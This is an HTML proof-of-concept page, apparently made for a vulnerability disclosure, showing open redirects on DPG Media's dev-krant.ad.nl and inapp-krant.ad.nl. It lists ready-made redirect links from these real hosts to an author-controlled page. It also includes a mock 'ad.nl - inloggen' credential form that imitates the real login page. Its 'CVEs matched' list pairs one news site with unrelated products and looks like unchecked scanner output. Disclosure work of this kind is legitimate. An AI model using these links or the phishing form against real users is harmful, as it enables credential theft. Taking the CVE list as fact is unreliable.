<!DOCTYPE html>
<html>
<head>
<title>ad.nl - inloggen</title>
</head>
<body>
<h1>open redirect PoC - dev-krant.ad.nl</h1>
<p><strong>target:</strong> dpg media (ad.nl)</p>
<p><strong>vulnerability:</strong> multiple open redirect vulnerabilities on dev-krant.ad.nl and inapp-krant.ad.nl</p>
<hr>

<h2>what's the impact?</h2>
<p>an attacker can craft a link using a trusted ad.nl domain that redirects victims to a malicious site.</p>
<p>this can be used for:</p>
<ul>
<li>phishing attacks (fake login pages)</li>
<li>malware distribution</li>
<li>OAuth token theft (if chained with OAuth flows)</li>
</ul>

<h2>verified working redirects</h2>
<p>click any link below - you'll be redirected FROM dev-krant.ad.nl TO this attacker-controlled page:</p>

<ol>
<li><a href="https://dev-krant.ad.nl/?wptouch_switch=desktop&redirect=https://c137req.github.io/ad-nl-open-redirect-poc.html?stolen=wptouch">wptouch_switch redirect</a></li>
<li><a href="https://dev-krant.ad.nl/index.php?redirect=https://c137req.github.io/ad-nl-open-redirect-poc.html?stolen=CVE-2004-1965">CVE-2004-1965</a></li>
<li><a href="https://dev-krant.ad.nl/novius-os/admin/nos/login?redirect=https://c137req.github.io/ad-nl-open-redirect-poc.html?stolen=CVE-2015-5354">CVE-2015-5354</a></li>
<li><a href="https://dev-krant.ad.nl/web/session/logout?redirect=https://c137req.github.io/ad-nl-open-redirect-poc.html?stolen=CVE-2017-5871">CVE-2017-5871</a></li>
<li><a href="https://dev-krant.ad.nl/homeautomation_v3_3_2/api.php?do=groups/toggle&groupid=1&status=1&redirect=https://c137req.github.io/ad-nl-open-redirect-poc.html?stolen=CVE-2020-21998">CVE-2020-21998</a></li>
<li><a href="https://dev-krant.ad.nl/index.php?page=acymailing_front&ctrl=frontusers&redirect=https://c137req.github.io/ad-nl-open-redirect-poc.html?stolen=CVE-2021-24288">CVE-2021-24288</a></li>
<li><a href="https://dev-krant.ad.nl/wp-json/anycomment/v1/auth/wordpress?redirect=https://c137req.github.io/ad-nl-open-redirect-poc.html?stolen=CVE-2021-24838">CVE-2021-24838</a></li>
</ol>

<h2>also affects inapp-krant.ad.nl:</h2>
<ol>
<li><a href="https://inapp-krant.ad.nl/?wptouch_switch=desktop&redirect=https://c137req.github.io/ad-nl-open-redirect-poc.html?stolen=inapp-wptouch">wptouch_switch redirect (inapp)</a></li>
</ol>

<hr>
<h2>proof of redirect</h2>
<p id="proof"></p>
<script>
var params = new URLSearchParams(window.location.search);
var stolen = params.get('stolen');
if (stolen) {
    document.getElementById('proof').innerHTML = '<strong style="color:red;">you were redirected here via: ' + stolen + '</strong><br>this proves the open redirect works. an attacker could have shown you a fake login page instead.';
} else {
    document.getElementById('proof').innerHTML = 'click one of the links above to test the redirect.';
}
</script>

<hr>
<h2>phishing demo - fake login page</h2>
<p>below is what an attacker could show after redirecting a victim:</p>
<br>
<div id="fake-login">
<h3>ad.nl - inloggen (FAKE - PoC only)</h3>
<form onsubmit="alert('credentials captured! email: ' + this.email.value + ' password: ' + this.password.value); return false;">
<label>e-mailadres:</label><br>
<input type="email" name="email" placeholder="uw@email.nl" size="30"><br><br>
<label>wachtwoord:</label><br>
<input type="password" name="password" placeholder="wachtwoord" size="30"><br><br>
<button type="submit">inloggen</button>
</form>
<p><small>this is a demonstration only. no data is actually sent anywhere.</small></p>
</div>

<hr>
<h2>technical details</h2>
<pre>
affected hosts:
- dev-krant.ad.nl
- inapp-krant.ad.nl

vulnerable parameters:
- ?redirect=
- ?wptouch_switch=desktop&redirect=

HTTP response:
HTTP/2 302
location: [attacker-controlled-url]

CVEs matched:
- CVE-2004-1965
- CVE-2015-5354
- CVE-2017-5871
- CVE-2020-21998
- CVE-2021-24288
- CVE-2021-24838
</pre>
</body>
</html>
